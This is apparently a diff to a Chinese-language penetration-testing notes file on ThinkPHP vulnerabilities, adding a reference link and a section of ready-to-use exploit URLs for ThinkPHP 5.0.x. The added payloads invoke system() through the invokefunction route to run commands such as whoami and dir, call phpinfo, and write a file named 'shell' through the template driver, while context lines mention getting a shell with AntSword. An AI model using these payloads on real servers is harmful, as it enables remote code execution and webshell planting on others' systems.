@@ -24,4 +24,29 @@ http://x.x.x.x/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/R
 
 - 使用蚁剑进行连接getshell。
 
+- 参考连接https://0xcreed.jxustctf.top/2021/07/ThinkPHP3-2-x-RCE%E5%A4%8D%E7%8E%B0/
 
+# tinkphp5.0.*漏洞利用
+payload
+```
+http://192.168.2.134/tp5/public/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
+```
+```
+/thinkphp/public/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=dir
+```
+```
+/thinkphp/public/?s=index/\think\app/invokefunction&function=phpinfo&vars[0]=1
+```
+```
+/thinkphp/public/?s=index/\think\app/invokefunction&function=system&vars=dir
+```
+```
+/thinkphp/public/?s=index/\think\app/invokefunction&function=system&return_value=&command=dir
+```
+```
+/thinkphp/public/?s=index/\think\app/invokefunction&function=system&vars[0]=dir&vars[1][]=
+```
+```
+/thinkphp/public/index.php?s=index/\think\template\driver\file/write&cacheFile=shell
+```
+# 参考连接https://forum.90sec.com/t/topic/704
